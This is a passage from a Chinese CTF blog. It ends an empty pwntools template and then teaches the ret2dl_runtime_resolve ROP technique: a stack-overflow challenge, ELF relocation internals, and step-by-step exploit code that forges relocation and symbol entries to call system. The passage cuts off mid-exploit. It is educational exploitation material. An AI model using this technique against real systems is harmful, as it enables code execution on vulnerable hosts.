class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'oreo'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'oreo'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/9f664865/">https://noone-hub.github.io/posts/9f664865/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>二进制,pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>高级ROP ret2dl_runtime 之通杀详解</title>
    <url>/posts/a606db69/</url>
    <content><![CDATA[<h1 id="高级ROP-ret2dl-runtime-之通杀详解-本文首发于先知社区"><a href="#高级ROP-ret2dl-runtime-之通杀详解-本文首发于先知社区" class="headerlink" title="高级ROP ret2dl_runtime 之通杀详解(本文首发于先知社区)"></a>高级ROP ret2dl_runtime 之通杀详解(本文首发于先知社区)</h1><p>前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了</p><h2 id="ret2dllruntime-原理"><a href="#ret2dllruntime-原理" class="headerlink" title="ret2dllruntime 原理"></a>ret2dllruntime 原理</h2><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>先推荐几个地址学习下</p><ul><li><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop" alt="ctf-wiki之高级ROP"></p></li><li><p><img src="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure/" alt="ctf-wiki之elf文件基本结构"></p></li></ul><p>虽然以上不是我的博客，不过这些个大佬帮助了我，给个链接也是应该的。<br>ctf-wiki那个题目我感觉不够经典，还多了个write函数，单一难以泄露才是最经典的题目，所以我选了这个题目来做示例</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的栈溢出<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcugf5krj30ao0ej3ys.jpg" alt="1"><br>可没有多余的函数可以泄露，这对于我这千年通过leak进行rop的玩家很不友好，因为这道题我做过，虽然当时没做出也没研究，不过以前欠过的债迟早要还的，在国赛就在遇到了它，国赛的时候我找到了别人的exp，0ctf-2018的题目一把梭了。在赛后好好研究了一下这个题目，发觉这类题型就是改改exp就可以通杀，发觉很舒服做这种题。好了，话不多说，开始正文：<br>没有leak，如何做呢，ctf-wiki高级ROP了解一波</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>要想弄懂这个 ROP 利用技巧，需要首先理解 ELF 文件的基本结构，以及动态链接的基本过程，请参考 executable 中 elf 对应的介绍。这里我只给出相应的利用方式。</p><p>我们知道在 linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下</p><pre><code>控制程序执行 dl_resolve 函数
    给定 Link_map 以及 index 两个参数。
    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。
控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。
伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。
伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</code></pre><p>此外，这个攻击成功的很必要的条件</p><pre><code>dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。
dl_resolve 函数最后的解析根本上依赖于所给定的字符串。</code></pre><p>注意：</p><pre><code>符号版本信息
    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。
重定位表项
    r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</code></pre><p><strong>相信各位看官在看到这里的时候跟我一样懵，因为我也不了解具体原理当时，看着这段话不知道什么意思，所以我就先去了解elf的基本结构以及动态链接的基本过程（PS:我也没完整看完，枯燥乏味，通过调试一点点理解过程的)</strong><br>这里先说下动态延迟绑定机制：<br>就是一开始把所有的函数都链接实际是一种浪费，因此采用延迟绑定技术,核心是第一次用的时候进行绑定，没有用到不进行绑定，这样用来加快程序的运行速度<br>所以第一次调用的这个函数的时候，程序会去查表，然后利用_dl_runtime_resolve将正确的地址写入got.plt表里，下次查询的时候就直接跳到正确的地址处<br>先看下调试部分吧</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">► <span class="number">0x8048390</span>  &lt;read@plt&gt;                  jmp    dword ptr [read@got.plt] &lt;<span class="number">0x804a00c</span>&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x8048396</span>  &lt;read@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line">  <span class="number">0x804839b</span>  &lt;read@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x8048380</span></span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x8048380</span>                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+<span class="number">4</span>] &lt;<span class="number">0x804a004</span>&gt;</span><br><span class="line">  <span class="number">0x8048386</span>                              jmp    dword ptr [<span class="number">0x804a008</span>] &lt;<span class="number">0xf7fe96c0</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0xf7fe96c0</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">  <span class="number">0xf7fe96c1</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">  <span class="number">0xf7fe96c2</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   edx</span><br><span class="line">  <span class="number">0xf7fe96c3</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0xf7fe96c7</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">  <span class="number">0xf7fe96cb</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;<span class="number">0xf7fe3ac0</span>&gt;</span><br></pre></td></tr></table></figure><p>这是我在read@plt处下断，</p><ul><li>你看他第一次调用的时候，<span class="exturl" data-url="bWFpbHRvOnJlYWRAZ290LnBsdA==" title="mailto:read@got.plt">read@got.plt<i class="fa fa-external-link"></i></span>里存的是下一条指令的地址，也就是0x8048396，</li><li>然后将read函数在表里的偏移push进去，这里push的是0，</li><li>然后跳到plt0里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的<span class="exturl" data-url="bWFpbHRvOnJlYWRAZ290LnBsdA==" title="mailto:read@got.plt">read@got.plt<i class="fa fa-external-link"></i></span>表里，然后将程序的控制权交给解析出来的地址指向的函数</li></ul><p><strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong><br>这只是通俗易懂的说法，实际伪造这个表起来不是那么简单，除非你理解了整个过程<br>我将ctf-wiki上的内容摘抄过来了，帮助你们理解，他是进行了完整的解释，我感觉太长了，不过我理解过后看的话，看懂了。。。</p><h2 id="elf部分的关键点（来自ctf-wiki"><a href="#elf部分的关键点（来自ctf-wiki" class="headerlink" title="elf部分的关键点（来自ctf-wiki)"></a>elf部分的关键点（来自ctf-wiki)</h2><p>动态链接器和程序按照如下方式解析过程链接表和全局偏移表的符号引用。</p><ol><li>当第一次建立程序的内存镜像时，动态链接器将全局偏移表的第二个和第三个项设置为特殊的值，下面的步骤会仔细解释这些数值。</li><li>如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。每一个进程镜像中的共享目标文件都有独立的 PLT 表，并且程序只在同一个目标文件将控制流交给 PLT 表项。因此，调用函数负责在调用 PLT 表项之前，将全局偏移表的基地址设置为寄存器中。</li><li>这里举个例子，假设程序调用了 name1，它将控制权交给了 lable .PLT1。</li><li>那么，第一条指令将会跳转到全局偏移表中 name1 的地址。初始时，全局偏移表中包含 PLT 中下一条 pushl 指令的地址，并不是 name1 的实际地址。</li><li>因此，程序将一个重定向偏移（reloc_index）压到栈上。重定位偏移是 32 位的，并且是非负的数值。此外，重定位表项的类型为 R_386_JMP_SLOT，并且它将会说明在之前 jmp 指令中使用的全局偏移表项在 GOT 表中的偏移。重定位表项也包含了一个符号表索引，因此告诉动态链接器什么符号目前正在被引用。在这个例子中，就是 name1 了。</li><li>在压入重定位偏移后，程序会跳转到 .PLT0，这是过程链接表的第一个表项。pushl 指令将 GOT 表的第二个表项 (got_plus_4 或者 4(%ebx)，当前 ELF 对象的信息) 压到栈上，然后给动态链接器一个识别信息。此后，程序会跳转到第三个全局偏移表项 (got_plus_8 或者 8(%ebx)，指向动态装载器中_dl_runtime_resolve 函数的指针) 处，这将会将程序流交给动态链接器。</li><li>当动态链接器接收到控制权后，他将会进行出栈操作，查看重定位表项，找到对应的符号的值，将 name1 的地址存储在全局偏移表项中，然后将控制权交给目的地址。</li><li>过程链接表执行之后，程序的控制权将会直接交给 name1 函数，而且此后再也不会调用动态链接器来解析这个函数。也就是说，在 .PLT1 处的 jmp 指令将会直接跳转到 name1 处，而不是再次执行 pushl 指令。</li></ol><p>在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用</p><p>_dl_runtime_resolve(link_map_obj, reloc_index)</p><p>这里以 32 位为例（64 位类似），具体的过程如下</p><ul><li>根据 reloc_index 计算相应的重定位表项：Elf32_Rel *reloc = JMPREL + index</li><li>根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)&gt;&gt;8</li><li>继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)&gt;&gt;8)]</li><li>判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )</li><li>if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)<ul><li>if (sym-&gt;st_other) &amp; 3 == 0 )</li><li>判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。</li></ul></li><li>得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。</li><li><ul><li>uint16_t ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8]</li></ul></li><li><ul><li>r_found_version *version = &amp;l-&gt;l_version[ndx]</li></ul></li><li>根据 name 来寻找相应函数在库中的地址。<ul><li>name = STRTAB + sym-&gt;st_name</li></ul></li></ul><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>刚刚我说了攻击方式，接下来我们就要伪造偏移跟表了<br>简单来说，ret2dllruntime这个攻击方式他要利用三个表:</p><ol><li>.rel.plt</li><li>.dynsym</li><li>.dynstr</li></ol><ul><li>他先从.rel.plt表里找到某个函数在dynsym里的偏移</li><li>然后从.dynsym符号表里找寻该函数在.dynstr表里的偏移</li><li>在从.dynstr表里找到具体的函数对应的字符串，然后将这个字符串解析成函数<br>所以如果我们可以找到这个表，改掉这个表里的字符串，按理说也是可以进行调用成功的<br>贴张图，这是整体结构部分图</li></ul><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wctwfkbtj311q0luwlp.jpg" alt="2"></p><h3 id="第一个表是-rel-plt也就是ELF-REL-Relocation-Table"><a href="#第一个表是-rel-plt也就是ELF-REL-Relocation-Table" class="headerlink" title="第一个表是.rel.plt也就是ELF REL Relocation Table"></a>第一个表是.rel.plt也就是ELF REL Relocation Table</h3><p>这个表里有个结构体，存储了写入位置和具体偏移量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LOAD:0804831C ; ELF REL Relocation Table</span><br><span class="line">LOAD:0804831C                 Elf32_Rel &lt;8049FFCh, 306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048324                 Elf32_Rel &lt;804A040h, 705h&gt; ; R_386_COPY stderr</span><br><span class="line">LOAD:0804832C                 Elf32_Rel &lt;804A060h, 905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048334                 Elf32_Rel &lt;804A064h, 605h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:0804833C ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:0804833C                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT <span class="built_in">read</span></span><br><span class="line">LOAD:08048344                 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT alarm</span><br><span class="line">LOAD:0804834C                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048354                 Elf32_Rel &lt;804A018h, 507h&gt; ; R_386_JMP_SLOT setvbuf</span><br><span class="line">LOAD:08048354 LOAD            ends</span><br></pre></td></tr></table></figure><ul><li>前面是写入的位置，而107代表的是偏移为1的导入函数，07代表的是导入函数的意思，所以你在exp里会看到&lt;&lt;8位或者&gt;&gt;8位这种操作，就是去掉07或者增加07</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">           Elf32_Addr r_offset;</span><br><span class="line">           Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><ul><li>他实际是个结构体，每个都由r_offset和r_info组成，r_info存的也是偏移，是在dynsym表里的偏移,例如read，他在这里是107h就是偏移为1的导入函数，从ELF Symbol Table里找</li></ul><h3 id="第二个表是-dynsym也就是ELF-Symbol-Table"><a href="#第二个表是-dynsym也就是ELF-Symbol-Table" class="headerlink" title="第二个表是.dynsym也就是ELF Symbol Table"></a>第二个表是.dynsym也就是ELF Symbol Table</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:080481DC ; ELF Symbol Table</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aRead - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aAlarm - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;alarm&quot;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aGmonStart - offset byte_804827C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804827C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804821C                            0&gt;</span><br><span class="line">LOAD:0804822C                 Elf32_Sym &lt;offset aSetvbuf - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;setvbuf&quot;</span><br><span class="line">LOAD:0804823C                 Elf32_Sym &lt;offset aStdout - offset byte_804827C, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:0804823C                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804824C                 Elf32_Sym &lt;offset aStderr - offset byte_804827C, \ ; &quot;stderr&quot;</span><br><span class="line">LOAD:0804824C                            offset stderr@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804825C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804827C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804825C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:0804826C                 Elf32_Sym &lt;offset aStdin - offset byte_804827C, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:0804826C                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure><p>在这个表里查到也就是第一个函数，没毛病，其实这个表每个项也是一个结构体</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure><p>我们所以要伪造的还有st_name，让他去我们的.dynstr表里查找，查找到我们需要的</p><h3 id="第三个表就是-dynstr了，也就是ELF-String-Table"><a href="#第三个表就是-dynstr了，也就是ELF-String-Table" class="headerlink" title="第三个表就是.dynstr了，也就是ELF String Table"></a>第三个表就是.dynstr了，也就是ELF String Table</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:0804827C ; ELF String Table</span><br><span class="line">LOAD:0804827C byte_804827C    db 0                    ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804827C                                         ; LOAD:080481FC↑o ...</span><br><span class="line">LOAD:0804827D aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048287 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:0804825C↑o</span><br><span class="line">LOAD:08048296 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:0804826C↑o</span><br><span class="line">LOAD:0804829C aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:080482A1 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:0804823C↑o</span><br><span class="line">LOAD:080482A8 aStderr         db &apos;stderr&apos;,0           ; DATA XREF: LOAD:0804824C↑o</span><br><span class="line">LOAD:080482AF aAlarm          db &apos;alarm&apos;,0            ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:080482B5 aSetvbuf        db &apos;setvbuf&apos;,0          ; DATA XREF: LOAD:0804822C↑o</span><br><span class="line">LOAD:080482BD aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482BD                                         ; DATA XREF: LOAD:0804821C↑o</span><br><span class="line">LOAD:080482CF aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:080482DE aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:080482E8                 dd 20000h, 2, 2 dup(20002h), 20001h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:0804830C                 dd 0D696910h, 20000h, 62h, 0</span><br></pre></td></tr></table></figure><p>这个没啥好解释的就是一串字符串，找到这个后，_dl_lookup就会拿这个字符串去查找对应的函数，然后将函数地址取回来写入got.plt表，最后将程序控制权交给该函数<br><strong>注意：这里的都是相对偏移地址，没有绝对地址，切记切记，不然等会构造exp的时候你会一脸懵逼的</strong></p><h2 id="exp详解"><a href="#exp详解" class="headerlink" title="exp详解"></a>exp详解</h2><p>我将exp分段进行讲述吧，从exp里调试或许能更清晰的解释这个过程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">io = process(<span class="string">'./pwn'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">'a'</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(rop.chain())</span><br></pre></td></tr></table></figure><p>这段只是进行栈的迁移，这个部分的知识自行到ctf-wiki补充，或者找些题目练下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br></pre></td></tr></table></figure><p><strong>这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析</strong><br>我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section header部分，他表里有个字段叫sh_addr</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    ELF32_Word      sh_name;</span><br><span class="line">    ELF32_Word      sh_type;</span><br><span class="line">    ELF32_Word      sh_flags;</span><br><span class="line">    ELF32_Addr      sh_addr;</span><br><span class="line">    ELF32_Off       sh_offset;</span><br><span class="line">    ELF32_Word      sh_size;</span><br><span class="line">    ELF32_Word      sh_link;</span><br><span class="line">    ELF32_Word      sh_info;</span><br><span class="line">    ELF32_Word      sh_addralign;</span><br><span class="line">    ELF32_Word      sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>成员 | 说明<br>-|-|-<br>sh_name |节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。<br>sh_type |根据节的内容和语义进行分类，具体的类型下面会介绍。<br>sh_flags |每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。<br>sh_addr |如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。<br>sh_offset |给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset|成员给出的是概念性的偏移。<br>sh_size |此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。<br>sh_link |此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。<br>sh_info |此成员给出附加信息，其解释依赖于节区类型。<br>sh_addralign |某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。也就是说，$sh_addr % sh_addralign$=0。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。<br>sh_entsize|某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。<br>sh_addr就是取这个地址，取进程镜像中的地址</p><h3 id="接下来是重点了"><a href="#接下来是重点了" class="headerlink" title="接下来是重点了"></a>接下来是重点了</h3><ul><li>如果这部分不理解，你就。。。</li><li>其实还是可以做这道题的，因为这是原理部分内容，完全可以复制黏贴一把梭，不用理解</li><li>不过做题图个啥，不就是懂这个原理嘛，接下来仔细解释下如何构造</li></ul><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line"><span class="comment">#对齐</span></span><br></pre></td></tr></table></figure><p>接下来就是真正的构造部分了，我先构造dynsym内容的地址，我将base_stage + 32作为system函数的偏移地址，也就是说，我知道了dynstr的system地址了，<strong>但我这随便取的base_stage + 32 有可能相对于dynsym不是个标准地址</strong> 什么叫标准地址，他的每个结构体都是16个字节，也就是说他的地址都是对齐的，我可能相对于他不是刚好一个对齐的地址，所以我这里需要对齐一下，利用我对齐上面部分的代码就可以进行对齐了。解释下：<br>假设内存布局是这样的</p><p>0x8048a00 11111111 22222222 33333333 44444444 dynsym起始位置<br>0x8048a10 11111111 22222222 33333333 44444444<br>0x8048a20 11111111 22222222 33333333 44444444<br>0x8048a30 11111111 22222222 33333333 44444444<br>0x8048a40 11111111 22222222 33333333 44444444<br>0x8048a50 11111111 22222222 33333333 44444444<br>0x8048a60 11111111 22222222 33333333 44444444<br>0x8048a70 11111111 22222222 33333333 44444444<br>0x8048a80 11111111 22222222 33333333 44444444</p><p>我base_stage + 32可能在这4个部分的任意位置，但这样是不行的，他的结构体只能从开头开始，所以我需要取他的这段开头的地址</p><ul><li>假设我在第3部分，第一个3的位置，那我base_stage + 32就是0x8048a88</li><li>利用上面那个计算方式就是0x10 - ((0x8048a88 - 0x8048a00) &amp; 0xf) = 0x10 - 0x8 = 0x8</li><li>故我的地址在加上align后就变成0x8048a90刚好是对齐了</li></ul><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_dynsym = (fake_sym_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">r_info = index_dynsym &lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line">read_got = elf.got[<span class="string">'setvbuf'</span>]</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line"><span class="comment">#构造.rel.plt表</span></span><br></pre></td></tr></table></figure><ul><li>然后利用这个对齐后的地址开始构造，我可以求出他在.rel.plt表中的偏移,别忘了，我当初说过的，这是相对偏移，所以我们要求r_info也是相对偏移，</li><li>先通过( fake_sym_addr - dynsym(基地址) )/0x10,求出偏移</li><li>然后再在这个地址后面添加上07标识，表示这个函数是导入函数，所以就变成了,左移8位就是增加一个字节，两位二进制位， |7相当于加7</li><li>然后我们需要一个地址进行写入，以后调用跳到这个表的函数就会直接去到函数的真实地址了，不过这里我们只需调用一次，不需要二次调用，所以地址可以随便写，当然，要可写的地址。。。我取了setvbuf的got表，然后将他做成个结构体</li><li>flat([])就是将里面的全变成字符</li></ul><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_sys = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span 